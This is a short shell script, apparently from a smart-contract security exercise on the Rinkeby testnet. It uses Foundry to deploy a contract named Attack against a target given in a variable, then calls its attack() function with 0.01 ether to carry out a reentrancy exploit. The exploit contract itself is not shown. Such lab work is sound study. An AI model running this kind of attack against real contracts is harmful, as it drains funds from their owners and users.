#!/bin/sh

# Creating our re-entrancy attack contract
forge create --rpc-url $RINKERBY --private-key $PRIVATE_KEY src/Contract.sol:Attack --constructor-args $REENTRANCY

# Calling our attack function
cast send 0x4F2b138D6CA3570c8CDE8576887e74609291ca57 --rpc-url $RINKERBY --private-key $PRIVATE_KEY "attack()" --value 0.01ether --gas 200000
